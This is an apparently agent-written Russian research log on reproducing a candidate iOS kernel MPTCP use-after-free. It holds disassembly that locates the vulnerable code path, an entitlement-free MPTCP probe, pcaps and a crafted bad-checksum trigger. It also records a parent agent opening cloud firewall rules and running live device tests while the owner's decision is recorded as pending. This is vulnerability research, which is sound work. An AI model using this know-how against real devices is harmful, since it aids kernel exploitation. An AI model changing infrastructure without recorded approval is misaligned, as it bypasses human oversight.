# 22. MPTCP (кандидат CVE-2026-86962): попытка живого воспроизведения на iPhone 13 (26.5.2 / 23F84)

Задача A. Итог: **на iPhone 13 не воспроизведено** (безопасный вариант `DATA_FIN=0`, один запуск, выполненный
родителем в 01:12Z — §9), **на iPhone 17 Pro Max не выполнено**. Моя собственная часть остановилась на блокере
транспорта (§4). Всё, что не подтверждено первоисточником или моим собственным запуском, помечено `ГИПОТЕЗА`.

## 1. Вердикт

| Устройство | Вариант | Ответ устройства | Живо | Вердикт |
|---|---|---|---|---|
| iPhone 13 `4A8A1186-…` (26.5.2 / 23F84) | DSS `data_len=1`, `DATA_FIN=0`, csum `0xDEAD` | нет ответа за 2 с; MP_FAIL не пришёл; паники нет | 1 запуск (родитель, 01:12Z, §9) | **не воспроизведено** |
| iPhone 17 Pro Max `EB205573-…` (27.2.1 / 24B156) | тот же | — | не запускался | **не выполнено** (устройство `unavailable` все 15 минут опроса) |

**MP_FAIL = достижимость, не доказательство UAF.** MP_FAIL не получен. Если бы он пришёл, он означал бы только:
(а) `socket(AF_MULTIPATH)` открывается из приложения без entitlement, (б) MPTCP-соединение установилось
с согласованной контрольной суммой, (в) DSS с плохой суммой дошёл до `mptcp_subflow_soreceive`.
При `DATA_FIN=0` mbuf извлекается из `so_rcv` **до** `mptcp_validate_csum` (перепроверено мной по
листингам, §5), поэтому `m_freem` освобождает уже снятый с очереди mbuf — это штатный ответ на плохую
сумму (`TMPF_SND_MPFAIL` + `m_freem` + `EIO`), а не признак повреждения памяти.

## 2. Хост сервера и что на нём изменено

**Выбран `hydra` (204.168.174.129, приватный 10.0.1.3).** Причины: side projects (наименее важный для
продакшена из четырёх), 16 ядер, ~22.9 GB available, python 3.12.3 + venv, 89 GB свободного диска.
Для сравнения на момент выбора (2026-11-27 00:40Z): core — load 10.5 при 12 ядрах (прод), operator —
crawl fleet + реплика, ops — 1.5 GB available.

Изменения на hydra — **ровно одно правило ufw** (в стиле репо: интерфейс, адреса, комментарий):

```
ufw allow in on enp7s0 from 10.0.1.2 to 10.0.1.3 port 9999 proto tcp \
  comment "jbresearch-mptcp PoC server (temporary, remove after test)"
# [12] 10.0.1.3 9999/tcp on enp7s0 ALLOW IN    10.0.1.2
```

Источник — только ops (10.0.1.2), т.е. **только для межхостовой проверки сервера**, не для телефона.
Снимок ufw до изменения: `tools/mptcp_live/hydra_artifacts/ufw.before.txt`.
**Наружу порт 9999 не открывался** — облачный `hydra-firewall` не трогал.

**Состояние на 2026-11-27T01:04Z: правило 9999 на hydra УДАЛЕНО — родителем (thr_3wd87nkk3d) в 00:58Z**
командой `ufw --force delete allow in on enp7s0 from 10.0.1.2 to 10.0.1.3 port 9999 proto tcp`, чтобы вернуть
хост в исходное состояние, пока владелец решает. `/etc/ufw/user.rules` mtime `00:58:48Z`; `ufw status numbered`
байт-в-байт совпадает со снимком «до» (`diff` пуст, проверено мной в 01:04Z).
Итог: **порт 9999 на hydra закрыт, сервер остановлен, открытых изменений на хосте нет.**

Файлы: `/root/jbresearch-mptcp/` (venv со scapy 2.8.0, `logs/`, `pcap/`, `setup_venv.sh`, скрипты).
Системные пакеты Python не менялись (venv без pip/ensurepip на Ubuntu 24.04; scapy ставился
`pip --python venv/bin/python`, на ops — распаковкой wheel в site-packages venv).
На ops (204.168.137.149) — только `/root/jbresearch-mptcp/` (venv + клиент-симулятор), настроек нет.
Одноразовые проверки: `ip link add jbtest0 type dummy` + `ip link del jbtest0` на hydra (создан и удалён).

**Почему не удалось открыть порт для телефона.** Наружу на всех четырёх хостах открыты только
22 (по источникам), 80, 443 (+ udp 3478 на ops). Новый TCP-порт требует правки **внешнего** слоя:
на hydra это `hcloud_firewall.hydra` — **управляется terraform** (`~/Projects/telagon/infra/hetzner/main.tf:52`),
на operator/ops — Hetzner Cloud firewall без кода; токена Hetzner у меня нет (`hcloud context list` пуст).
По условию задачи terraform-управляемое не менял, а вернулся с вопросом.

## 3. Транспорт PoC: IP-версия и её проверка

Оригинал `mptcp_dfin_reach.py` рассчитан на L2 (`sendp`, `iptables -j DROP` для RST). Написан
`tools/mptcp_live/mptcp_ip_server.py` (оригинал не менялся): приём `AF_PACKET` sniff (`tcp/<port>`),
отправка raw `L3RawSocket`; SYN → SYN-ACK `MP_CAPABLE v1` + `MPCAP_CHECKSUM_CBIT` → ACK →
**один** DSS `data_len=1`, `DATA_FIN=0`, csum `0xDEAD`, 1 байт payload. Без спрея, без FIN, без RST.
Режим `dfin` намеренно отказывается выполняться. Скрипт **не ставит** правила firewall: `--check-rst-filter`
только проверяет наличие фильтра RST и сообщает.

**Проверка между ops (клиент-симулятор) и hydra** — `tools/mptcp_live/hydra_artifacts/pcap/interhost_6.pcap`,
`logs/server_6.log` (2026-11-27 00:56:54Z):

```
10.0.1.2:53900 > 10.0.1.3:9999  [S]   mptcp capable v1                 (клиент)
10.0.1.3:9999  > 10.0.1.2:53900 [R.]            ← RST ядра hydra, +0.16 мс
10.0.1.3:9999  > 10.0.1.2:53900 [S.]  mss,nop,nop,wscale7,mptcp capable v1 csum {0x102030405060708},eol  ← +3.0 мс
10.0.1.2:53900 > 10.0.1.3:9999  [.]   3-й ACK
10.0.1.3:9999  > 10.0.1.2:53900 [R]   ← RST ядра
10.0.1.3:9999  > 10.0.1.2:53900 [.]   ACK сервера
10.0.1.2:53900 > 10.0.1.3:9999  [P.]  dss ack 0xd29d6f73 seq 0xb76ae9a6 subseq 0 len 1   1 байт
10.0.1.3:9999  > 10.0.1.2:53900 [R]   ← RST ядра
10.0.1.3:9999  > 10.0.1.2:53900 [.]   ACK
10.0.1.3:9999  > 10.0.1.2:53900 [P.]  dss ack 0xd29d6f73 seq 0xd29d6f73 subseq 1 len 1 csum 0xdead  1 байт  ← триггер
```

Сервер ведёт себя ровно как задумано по коду: checksum-бит в SYN-ACK выставлен (tcpdump сам показывает
`csum`), триггер — `data_len=1` без `DATA_FIN` с плохой суммой. Замечание о симуляторе: его SYN/ACK
tcpdump читает как `mptcp join[bad opt]` (симулятор кладёт MP_CAPABLE без `kind/len`); на разбор
сервером это не повлияло, но это дефект тестового стенда, не сервера.

## 4. Блокер живого теста

**Ядро Linux отвечает RST на SYN для порта без слушателя раньше, чем raw-сервер успевает послать
SYN-ACK** (в дампе: RST через 0.16 мс после SYN, SYN-ACK через 3.0 мс). Настоящий XNU-клиент получит
RST и закроет соединение до handshake. Единственный способ это обойти — правило `DROP` для исходящих
RST (`iptables -I OUTPUT -p tcp --sport 9999 --tcp-flags RST RST -j DROP`), а это изменение firewall,
**не входящее** в разрешение задачи (разрешён «один входящий TCP-порт»). Обхода без firewall-правила
нет: ядро шлёт RST только для локально доставленных пакетов, а не-локальный адрес на хост не маршрутизируется.

Дополнительно нужен путь от телефона до сервера: наружу порт закрыт (см. §2). Возможный путь без
внешнего порта — WireGuard `wg-admin` на operator (телефон — peer 10.78.0.3), но и там нужен RST-фильтр.

Вариант проведения (не проводить / через wg-admin на operator / hydra наружу / Linux рядом с телефоном)
родитель задал владельцу отдельным вопросом; **ответа на момент записи нет**. Мой дублирующий вопрос отозван.

## 5. Статика (перепроверено мной по листингам, не по чужому анализу)

Источник: `xnu-12377.121.6/bsd/netinet/{mptcp_subr.c,mptcp.c,mptcp_usrreq.c}`, `bsd/kern/uipc_socket2.c`.
Листинги: `/tmp/jbresearch/mptcp_chk/x13_soreceive.dis` (23F84), `x17_soreceive.dis` (24B156);
дизассемблер `/tmp/jbresearch/mptcp_chk/dump.py`.

1. **`dlen = mp_rlen − DFIN`.** 23F84: `0xa20c6a4 ldrh w25,[x9,#0xac]` (mp_rlen), `0xa20c700 and w10,w26,#0x40000000`
   (PKTF_MPTCP_DFIN), `0xa20c70c add w24,w25,w10,asr #31`; 24B156 — `0xb0508dc…0xb0508e8` то же.
   Цикл извлечения пропускается только при `dlen ≤ 0`: `0xa20c740 cmp w24,#1; b.lt 0xa20c974`
   (23F84), `0xb0509d0 cmp w24,#1; b.lt 0xb050c18` (24B156).
2. **`DATA_FIN=0, data_len=1` → цикл выполняется.** 23F84: тело `0xa20c748…0xa20c938` (`0xa20c8d8 bl 0xa37f768`
   = sbfree, `0xa20c904 str x14,[x19,#0x88]` = `sb_mb = m->m_next`, `0xa20c934 sub w24,w24,w25` = `dlen -= m->m_len`),
   затем `0xa20cb34 ldur x1,[x29,#-0x60]` (start) → `0xa20cb44 bl 0xa1fe204`. 24B156: тело `0xb0509d0…0xb050bd4`
   (`0xb050b70 bl 0xb1ce2b8` = sbfree, `0xb050b94 str x25,[x22]` = `*mp = m`, `0xb050b9c str x13,[x19,#0x88]`
   = `sb_mb = m->m_next`, `0xb050bd0 sub w24,w24,w23`), затем `0xb050df8 mov x1,x28` → `0xb050e0c bl 0xb042128`.
   Итог: validate получает **уже извлечённый** mbuf (это штатный ответ на плохую сумму, не UAF).
3. **`0xa1fe204` (23F84) и `0xb042128` (24B156) = `mptcp_validate_csum`** — по структуре совпадают с
   `mptcp_input_csum`: `subs w9,w4,w6` (`dlen−dfin`, `VERIFY ≥ 0`), `ldr x10,[x0,#0x3c0]`/`[x0,#0x410]`
   (`tptomptp`), `ldrb [..#0xc]` (`MPTCPF_CHECKSUM`), `tbnz w10,#0x10` (`TMPF_TCP_FALLBACK`),
   цикл по цепочке `m_len`(`+0x18`)/`m_next`(`+0x0`) = `m_length2`.
4. **Путь `dlen==0` (23F84 `0xa20c974`, 24B156 `0xb050d8c`) не отключает mbuf от `so_rcv`**: в обоих
   блоках — `*mp0 = NULL`, чтение `sb_mb`, вызов soevent-подобный, **без записи в `sb_mb`**; далее validate
   получает `start`, всё ещё числящийся в очереди. Это уязвимый порядок из отчёта — он достижим при
   `DFIN=1 ∧ data_len=1` (запрещённый вариант), и в 24B156 для этого случая добавлен отдельный блок
   отключения (`0xb0508dc…0xb050994`: условие `DFIN ∧ dlen==0 ∧ mp_rlen==1`, внутри
   `0xb050978 str x13,[x19,#0x88]` = `sb_mb = m->m_next`), который в 23F84 отсутствует.
   Уточнение адреса из задания: условие начинается на `0xb0508dc` (`and`), а `0xb0508fc` — это
   `cbz w12` (ветка «DFIN=0 → мимо блока»); это одна конструкция.
5. **`DFIN=0 ∧ dlen==0` (`mp_rlen==0`)** — по исходнику недостижим для mbuf, попавшего в очередь:
   `sbappendmptcpstream_rcv` (`bsd/kern/uipc_socket2.c:1605`) при `m_pktlen(m)==0` без `PKTF_MPTCP_DFIN`
   делает `m_freem(m)` и `return 0` (очередь не трогается), а `mptcp_update_rcv_state_meat` (`mptcp.c:1128`)
   при `data_len==0` вызывает `mptcp_notify_mpfail` (Infinite Mapping). `ГИПОТЕЗА` (вывод из исходника + листинга,
   живым тестом не проверялось).
6. **Entitlement**: `mptcp_entitlement_check` (`mptcp_usrreq.c:222`) отказывает (`:251`) только для
   `MPTCP_SVCTYPE_AGGREGATE` (2); тип 0 (HANDOVER, по умолчанию) и 1 (INTERACTIVE) без entitlement
   проходят. `ГИПОТЕЗА` до живой проверки — именно её должна была закрыть проба.

## 6. Проба для iPhone 13 (собрана, на устройство НЕ устанавливалась)

`tools/mptcp_live/x13_probe/mptcp_probe.m` (+ `wqprobe.m`, патч `project.pbxproj` в четырёх местах,
образец `aio_probe.m`; ID `DD7E5A110000000000000031/32`). Логика: `socket(AF_MULTIPATH=39, SOCK_STREAM, 0)`
→ `setsockopt(MPTCP_SERVICE_TYPE=0x213)` → `connectx()` → `select` 5 с → `send` 1 байт → `recv` 2 с →
`close`. Каждый шаг логируется **до** вызова, с `errno`. Две попытки за запуск: svc по умолчанию
(HANDOVER) и INTERACTIVE (1); AGGREGATE (2) не пробует. Цель — `tmp/mptcp_target.txt` («IP PORT»).
`./build.sh` → `BUILD SUCCEEDED`, подпись `me.strelov.wqprobe` / `25U9HN34VM`.

Вызов из `wqprobe.m` (единственное изменение хоста пробы; остальное — как в `wq2`):

```objc
void mptcp_probe_run(char *host, int port);
...
        char host[64] = "0.0.0.0"; int port = 0;
        NSString *tf = [NSTemporaryDirectory() stringByAppendingPathComponent:@"mptcp_target.txt"];
        NSArray *parts = [[NSString stringWithContentsOfFile:tf encoding:NSUTF8StringEncoding error:nil] componentsSeparatedByString:@" "];
        if (parts.count >= 2) { snprintf(host, sizeof host, "%s", [parts[0] UTF8String]); port = [parts[1] intValue]; }
        Log([NSString stringWithFormat:@"mptcp target %s:%d", host, port]);
        if (port > 0) mptcp_probe_run(host, port); else Log(@"no target; nothing sent");
```

Текст `mptcp_probe.m` (дословно, sha256 `cfb6b4cb…a9e4`):

```objc
// mptcp_probe.m — Task A (candidate CVE-2026-86962): can an app without the MPTCP entitlement
// open AF_MULTIPATH and connectx() to our server? Logs every step before the call.
// Safe only: this app sends one byte and reads; the server decides what comes back.
// The DFIN variant is never requested from here.
#import <Foundation/Foundation.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <ifaddrs.h>
#include <net/if.h>
#include <sys/sysctl.h>
#include <dlfcn.h>

#ifndef AF_MULTIPATH
#define AF_MULTIPATH 39
#endif
#ifndef MPTCP_SERVICE_TYPE
#define MPTCP_SERVICE_TYPE 0x213
#endif
#define MPTCP_SVCTYPE_HANDOVER 0
#define MPTCP_SVCTYPE_INTERACTIVE 1

#ifndef SAE_ASSOCID_ANY
typedef unsigned int sae_associd_t;
typedef unsigned int sae_connid_t;
#define SAE_ASSOCID_ANY 0
#define SAE_CONNID_ANY 0
typedef struct sa_endpoints {
    unsigned int sae_srcif;
    struct sockaddr *sae_srcaddr;
    socklen_t sae_srcaddrlen;
    struct sockaddr *sae_dstaddr;
    socklen_t sae_dstaddrlen;
} sa_endpoints_t;
extern int connectx(int, const sa_endpoints_t *, sae_associd_t, unsigned int,
                    const struct iovec *, unsigned int, size_t *, sae_connid_t *);
#endif

static int (*g_connectx)(int, const sa_endpoints_t *, sae_associd_t, unsigned int,
                         const struct iovec *, unsigned int, size_t *, sae_connid_t *);

static void L(NSString *s) { printf("%s\n", s.UTF8String); fflush(stdout); }

static NSString *addrList(void) {
    struct ifaddrs *ifas = NULL; NSMutableString *s = [NSMutableString string];
    if (getifaddrs(&ifas) == 0) {
        for (struct ifaddrs *i = ifas; i; i = i->ifa_next) {
            if (!i->ifa_addr || i->ifa_addr->sa_family != AF_INET) continue;
            char b[INET_ADDRSTRLEN] = {0};
            struct sockaddr_in *a = (struct sockaddr_in *)i->ifa_addr;
            inet_ntop(AF_INET, &a->sin_addr, b, sizeof b);
            [s appendFormat:@"%s=%s ", i->ifa_name, b];
        }
        freeifaddrs(ifas);
    }
    return s;
}

static NSString *osBuild(void) {
    size_t n = 0; sysctlbyname("kern.osversion", NULL, &n, NULL, 0);
    char *b = calloc(n + 1, 1); sysctlbyname("kern.osversion", b, &n, NULL, 0);
    size_t m = 0; sysctlbyname("kern.osproductversion", NULL, &m, NULL, 0);
    char *v = calloc(m + 1, 1); sysctlbyname("kern.osproductversion", v, &m, NULL, 0);
    NSString *r = [NSString stringWithFormat:@"iOS %s (%s)", v, b];
    free(b); free(v); return r;
}

// One attempt: socket -> (service type) -> connectx -> send 1 byte -> recv with 2 s timeout -> close.
static void attempt(NSString *host, int port, int svc, BOOL setSvc) {
    NSString *tag = setSvc ? [NSString stringWithFormat:@"svc=%d", svc] : @"svc=default";
    L([NSString stringWithFormat:@"--- attempt %@ -> %@:%d", tag, host, port]);

    L(@"[1] socket(AF_MULTIPATH=39, SOCK_STREAM, 0) ...");
    int fd = socket(AF_MULTIPATH, SOCK_STREAM, 0);
    int e = errno;
    L([NSString stringWithFormat:@"[1] socket -> fd=%d errno=%d (%s)", fd, e, strerror(e)]);
    if (fd < 0) return;

    if (setSvc) {
        L([NSString stringWithFormat:@"[2] setsockopt(IPPROTO_TCP, MPTCP_SERVICE_TYPE=0x213, %d) ...", svc]);
        int r = setsockopt(fd, IPPROTO_TCP, MPTCP_SERVICE_TYPE, &svc, sizeof(svc));
        e = errno;
        L([NSString stringWithFormat:@"[2] setsockopt -> %d errno=%d (%s)", r, e, strerror(e)]);
    } else {
        L(@"[2] setsockopt(MPTCP_SERVICE_TYPE) skipped (default = HANDOVER)");
    }

    // Non-blocking, so that a dead peer cannot hang the probe; the result is the errno.
    int nb = 1; ioctl(fd, FIONBIO, &nb);

    struct sockaddr_in dst; memset(&dst, 0, sizeof dst);
    dst.sin_len = sizeof(dst); dst.sin_family = AF_INET; dst.sin_port = htons((uint16_t)port);
    inet_pton(AF_INET, host.UTF8String, &dst.sin_addr);

    sa_endpoints_t eps; memset(&eps, 0, sizeof eps);
    eps.sae_dstaddr = (struct sockaddr *)&dst; eps.sae_dstaddrlen = sizeof(dst);
    sae_connid_t cid = 0;

    if (!g_connectx) g_connectx = dlsym(RTLD_DEFAULT, "connectx");
    L([NSString stringWithFormat:@"[3] connectx(fd=%d, %@:%d, SAE_ASSOCID_ANY, cid=0) ...", fd, host, port]);
    errno = 0;
    int rv = g_connectx ? g_connectx(fd, &eps, SAE_ASSOCID_ANY, 0, NULL, 0, NULL, &cid) : -1;
    e = errno;
    L([NSString stringWithFormat:@"[3] connectx -> rv=%d errno=%d (%s) cid=%u", rv, e, strerror(e), cid]);

    // Wait for the handshake result, up to 5 s.
    struct timeval tv = {5, 0};
    fd_set wf; FD_ZERO(&wf); FD_SET(fd, &wf);
    int sr = select(fd + 1, NULL, &wf, NULL, &tv);
    int soerr = 0; socklen_t sl = sizeof soerr; getsockopt(fd, SOL_SOCKET, SO_ERROR, &soerr, &sl);
    L([NSString stringWithFormat:@"[4] select(write,5s) -> %d  SO_ERROR=%d (%s)", sr, soerr, strerror(soerr)]);
    if (sr <= 0 || soerr != 0) { L(@"[=] handshake did not complete"); close(fd); return; }
    L(@"[5] handshake complete (writable, SO_ERROR=0)");

    const char msg = 'A';
    L(@"[6] send(fd, 1 byte) ...");
    errno = 0;
    ssize_t n = send(fd, &msg, 1, 0);
    e = errno;
    L([NSString stringWithFormat:@"[6] send -> %ld errno=%d (%s)", (long)n, e, strerror(e)]);

    char buf[256];
    struct timeval tv2 = {2, 0};
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv2, sizeof tv2);
    L(@"[7] recv(fd, 256) with 2 s timeout ...");
    errno = 0;
    ssize_t r = recv(fd, buf, sizeof buf, 0);
    e = errno;
    L([NSString stringWithFormat:@"[7] recv -> %ld errno=%d (%s) bytes=%.*s", (long)r, e, strerror(e),
                                (int)(r > 0 ? r : 0), r > 0 ? buf : ""]);

    // Let the kernel finish anything queued from the peer (MP_FAIL handling) before closing.
    usleep(300000);
    L(@"[8] close(fd)");
    close(fd);
}

void mptcp_probe_run(char *host, int port) {
    NSString *h = [NSString stringWithFormat:@"%s", host];
    L([NSString stringWithFormat:@"=== mptcp_probe %@ | addrs: %@", osBuild(), addrList()]);
    L([NSString stringWithFormat:@"AF_MULTIPATH=%d MPTCP_SERVICE_TYPE=0x%x connectx=%p",
       AF_MULTIPATH, MPTCP_SERVICE_TYPE, dlsym(RTLD_DEFAULT, "connectx")]);
    // Attempt 1: default service type (HANDOVER). Attempt 2: INTERACTIVE. AGGREGATE (2) is not tried.
    attempt(h, port, MPTCP_SVCTYPE_HANDOVER, NO);
    attempt(h, port, MPTCP_SVCTYPE_INTERACTIVE, YES);
    L(@"=== mptcp_probe done");
}
```

Устройство подтверждено по devicectl ID: iPhone 13, 26.5.2 / 23F84, wired, developer mode enabled.
Crash-логов «до»: 52 файла (все `wqprobe-*`/`stacks-*` от прошлых прогонов, panic-файлов нет).

## 7. Чего не сделано и что осталось открытым

- Моя часть живого теста остановлена на блокере §4; один запуск на iPhone 13 выполнил родитель (§9) — MP_FAIL
  не получен. iPhone 17 Pro Max — **не выполнено** (`unavailable`, `tools/mptcp_live/logs/wait17_iphone17promax.log`:
  15/15 unavailable, 00:42–00:57Z; родителем не запускался).
- `DATA_FIN=1` не запускался ни на одном устройстве и не будет.
- Правило ufw 9999 на hydra — **снято родителем в 00:58Z** (см. §2); закрывать нечего. Папки `/root/jbresearch-mptcp/`
  на hydra и ops оставлены как есть — уберём, когда владелец примет решение.
- Сервер на hydra остановлен (все запуски были с `--timeout`); tcpdump-процессов нет.

## 8. Закрытие

_Задача A закрыта родителем: живой тест не выполнен, iPhone 17 Pro Max не выполнен, стенд и PoC готовы._
Выбор по живому тесту (не проводить / через wg-admin на operator / hydra наружу / Linux рядом с телефоном)
родитель задал владельцу отдельным вопросом; мой дублирующий AskUserQuestion отозван, ответ на него не нужен.

Фактическое состояние на 01:05Z:

- hydra: порт 9999 **закрыт** (правило ufw снято родителем в 00:58Z, состояние ufw идентично исходному),
  сервер и tcpdump не запущены.
- ops: настроек не менялось, процессов нет.
- `/root/jbresearch-mptcp/` на hydra и ops — оставлены до решения владельца (там venv, скрипты, pcap, логи;
  копии pcap/логов уже в `tools/mptcp_live/hydra_artifacts/`).
- iPhone 13: моя сборка с `mptcp_probe.m` **не устанавливалась**; на устройстве осталась прежняя сборка `wqprobe`
  (какая именно — не проверял, `ГИПОТЕЗА`). Переустановка не требуется.
- Проект `wq_x13` возвращён в состояние «до меня»: `wqprobe.m` байт-в-байт равен `wq2/wqprobe.m`,
  `project.pbxproj` равен моему снимку «до» (4 мои строки с `mptcp_probe.m` удалены), `mptcp_probe.m` вынесен
  из каталога (копия — `tools/mptcp_live/x13_probe/`); пересборка через `./build.sh` — `BUILD SUCCEEDED`,
  `me.strelov.wqprobe` / `25U9HN34VM`, строк `mptcp_probe`/`AF_MULTIPATH` в бинарнике нет.
  Отличие `wq_x13` от `wq2`, существовавшее до меня и не моё: в `project.pbxproj` `wq_x13` зарегистрированы
  `aio_freed_probe.m` и `iogpu_l13_probe.m`.

Если владелец разрешит живой тест: нужен RST-фильтр на сервере + путь от телефона до сервера (§4),
сервер `tools/mptcp_live/mptcp_ip_server.py --mode fail`, ≤3 попытки с DFIN=0, затем удалить все добавленные правила.

## 9. Дополнение родителя, 01:12–01:16Z (передано thr_3wd87nkk3d; мною не выполнялось и не перепроверялось)

После моего закрытия родитель провёл живой тест сам. Сделано родителем: облачный firewall hydra — `9999/tcp`
только с `200.225.112.0/22` (через hcloud API); на hydra — ufw-правило и RST-фильтр; сервер запускался;
MPTCP-сборка собрана в отдельной копии `/tmp/jbresearch/mptcp_x13` (`wq_x13` не трогался) и запущена на
iPhone 13 в 01:12Z.

Результат первого запуска (со слов родителя):

- `socket(AF_MULTIPATH)` открылся без entitlement; `connectx` завершился (`SO_ERROR=0`).
- Сервер получил от `200.225.112.187` SYN `MP_CAPABLE`, 3-й ACK и 1 байт и отправил DSS `data_len=1`,
  `DATA_FIN=0`, `csum=0xDEAD`.
- **Ответа от устройства за 2 с не было** (`recv` → `EAGAIN`), **MP_FAIL не пришёл**, паники нет.

Что это значит. Первая развилка закрыта: MPTCP из стороннего приложения без entitlement доступен, соединение
устанавливается, байты до сервера доходят. Но MP_FAIL в дампе не зафиксирован, поэтому пункт (в) критерия —
«DSS с плохой суммой дошёл до `mptcp_subflow_soreceive`» — **не подтверждён**. `ГИПОТЕЗА` (не проверялось):
между ними стоял NAT (`200.225.112.187` — тот же внешний адрес, что у ноутбука в `wg-admin`), и/или сервер
не получил MP_CAPABLE телефона с битом checksum, так что checksum на соединении не был согласован.

По устройствам (безопасный вариант `DATA_FIN=0`):

| Устройство | Сборка | Ответ устройства | Паника | Вердикт |
|---|---|---|---|---|
| iPhone 13 (26.5.2 / 23F84) | родителя, 01:12Z, 1 запуск | нет ответа за 2 с, MP_FAIL не пришёл | нет | **не воспроизведено** (MP_FAIL не получен) |
| iPhone 17 Pro Max (27.2.1 / 24B156) | — | — | — | **не выполнено** (не запускался) |

Правила с hydra и облачный firewall снимает родитель, серверные папки удаляет родитель. iPhone 13 больше
не запускается, сборка на нём не меняется.

## 10. Воспроизводимость: версии и хэши

| Компонент | Версия / хэш |
|---|---|
| hydra 204.168.174.129 | Ubuntu 24.04, kernel `6.8.0-107-generic`, Python 3.12.3 (venv), scapy 2.8.0, tcpdump 4.99.4 |
| ops 204.168.137.149 | Ubuntu 24.04, kernel `6.8.0-147-generic`, Python 3.12.3 (venv), scapy 2.8.0 |
| `mptcp_ip_server.py` | sha256 `383598b45e9cf28d96ef9707ef117a2743d29c506e339ec4378821ecba99d718` (одинаков на ноутбуке и на hydra) |
| `mptcp_sim_client.py` | sha256 `44ac00152e8f5b46a899857bf6e96f251f120373412b7b31c1d686d29ee95e2b` (одинаков на ноутбуке и на ops) |
| `x13_probe/mptcp_probe.m` | sha256 `cfb6b4cb7cf9613934ac0619e52a9c0cd331763b8b4b2a9d40603d11276da9e4` |
| xnu source (статика) | `xnu-12377.121.6`: `bsd/netinet/{mptcp_subr.c,mptcp.c,mptcp_usrreq.c}`, `bsd/kern/uipc_socket2.c` |
| kernelcache | 23F84: `/tmp/jbresearch/ipsw/x13/kc.decomp/kernelcache.release.iphone14.decompressed`; 24B156: `/tmp/jbresearch/ipsw/x17/kc.decomp/kernelcache.release.v54.decompressed` |

Команды стенда (воспроизведение проверки между хостами):

```
# hydra
cd /root/jbresearch-mptcp && ./venv/bin/python mptcp_ip_server.py --iface enp7s0 --port 9999 --mode fail \
  --count 1 --timeout 22 --pcap pcap/server_6.pcap --log logs/server_6.log --server-key-hex 0102030405060708
# ops
cd /root/jbresearch-mptcp && ./venv/bin/python mptcp_sim_client.py --iface enp7s0 --src 10.0.1.2 --dst 10.0.1.3 \
  --port 9999 --server-key-hex 0102030405060708
```

## 11. Живой прогон родителя с исправленным стендом (01:22–01:27Z, v2-сервер) — главный результат

Раздел 9 описывает первый запуск, в котором триггер **не дошёл** до XNU как валидный DSS. Причина — дефект
стенда, найденный по pcap: сервер после третьего ACK не отправлял свой `MP_CAPABLE` с ключом в пакете
с данными. XNU шлёт `MP_CAPABLE` в третьем ACK **и** в первом пакете с данными (пакеты 3 и 4, по 18 и 22
байта опции) и ждёт того же от сервера; пока handshake не завершён, DSS-опции от сервера отбрасываются.

Исправление — `mptcp_ip_server_v2.py` (в `tools/mptcp_live/`): после третьего ACK сервер шлёт
`MP_CAPABLE` (`01 81 <key8>`) с 1 байтом данных, затем ACK, затем триггер. Проверен между ops и hydra
(симулятор): handshake, данные, триггер уходят. Протокол проверен по байтам pcap, не по исходнику —
в открытом XNU 12377.121.6 серверной логики MP_CAPABLE нет (ГИПОТЕЗА о «MP_CAPABLE с данными»
подтверждена только pcap с устройством).

### 11.1 iPhone 17 Pro Max, iOS 27.2.1 / 24B156 (01:25:20Z, `v4.pcap`, 23 пакета на eth0)

| # | Кто | Что | Опция MPTCP |
|---|---|---|---|
| 1 | телефон | SYN | `MP_CAPABLE` v1 |
| 2 | сервер | SYN-ACK | `MP_CAPABLE` + бит CHECKSUM |
| 3 | телефон | третий ACK | `MP_CAPABLE` 18 Б (оба ключа) |
| 4 | телефон | 1 байт `41` | `MP_CAPABLE` 22 Б |
| 5 | сервер | 1 байт `00` | `MP_CAPABLE` 12 Б (v2) |
| 6 | сервер | ACK | — |
| 7 | сервер | 1 байт `de` | **DSS flags `0x05`, data_len `0001`, DATA_FIN=0, csum `dead`** |
| 8 | телефон | ACK | **DSS flags `0x04` (без Data-ACK), data_len `0000`, csum `0000`** |
| 9–11 | телефон | 2×ACK, FIN | — |

**Вывод по 24B156:** `socket(AF_MULTIPATH)` и `connectx` из приложения без entitlement работают и на
27.2.1; триггер доходит и принимается ядром; **паники нет, приложение получает `EAGAIN` (данные не
доставлены), MP_FAIL не отправлен**. Ответ телефона — DSS нулевой длины **без Data-ACK**: mapping с
плохой суммой не подтверждён. По листингу `mptcp_validate_csum` 24B156 (`0xb04226c`: `orr w9,w10,#0x200000`
— `TMPF_SND_MPFAIL`) ядро ставит флаг отправки MP_FAIL, но MP_FAIL не вышел. Причина установлена 23:10 (см.
`05_open_questions_and_next.md`, раздел 23:10): `SND_MPFAIL` ставится на tcpcb **подпотока**, а
`TMPF_TCP_FALLBACK` — на tcpcb **родителя** (`0xb042274…0xb0422a4`); `mptcp_opt.c:365` требует оба флага
на одном `tp`. Прежняя гипотеза «FIN закрыл сессию раньше» снята: FIN ушёл через 0.30 с после триггера. Двойного освобождения на этом пути нет — согласуется со статикой B
(в 24B156 mbuf отключается от `so_rcv` до validate, `0xb0508fc`).

### 11.2 iPhone 13, iOS 26.5.2 / 23F84 — сравнение не получено

После первого запуска (раздел 9) и трёх неудачных handshakes (сервер уже вышел, SYN без ответа) XNU на
23F84 **перестал предлагать MPTCP к этому адресу**: в `v5_x13.pcap` SYN телефона идёт **без опции
`mptcp`** (обычный TCP, 12 SYN-ретрансляций). Это штатный MPTCP-fallback. Поэтому **сравнение двух билдов
на одном исправленном стенде не сделано** — для 23F84 нужен другой адрес/порт сервера или пауза до
сброса fallback-состояния. Утверждение «на 23F84 behave иначе» этим прогоном **не доказано**.

### 11.3 Состояние после прогона (01:29Z)

- **hydra:** серверы и tcpdump остановлены, RST-правило iptables удалено, ufw = 15 правил (базовый
  уровень), `/root/jbresearch-mptcp/` удалена. **ops:** симулятор/tcpdump остановлены, папка удалена.
- **Hetzner cloud firewall 10722209:** оба временных правила удалены; 6 правил, сверен по всем полям со
  снимком «до» — **идентичен** (`live_run_20261127/hydra/firewall.{before,after}.json`).
- **Устройства:** на оба телефона в 01:29Z поставлена сборка из `/tmp/jbresearch/wq_x13` как есть
  (исходный пробник владельца, без necp и mptcp). NECP-сборка `thr_sxdgwvv7fc` восстановлена **не была**
  (не знаю её конфигурации) — ему отправлено сообщение.
